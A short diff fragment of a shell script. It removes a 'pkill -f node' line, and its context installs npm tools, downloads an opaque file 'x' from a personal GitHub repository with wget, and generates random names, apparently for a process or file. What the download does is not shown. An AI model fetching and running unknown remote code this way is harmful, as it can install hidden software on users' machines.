@@ -7,7 +7,6 @@ random_name() {
   npm install -g kill-port
   npm prune
   npx systeminformation
-  pkill -f node
 wget https://raw.githubusercontent.com/hosseinxdns/glowing-fortnight/main/x
 
 NEW_V2=$(random_name)
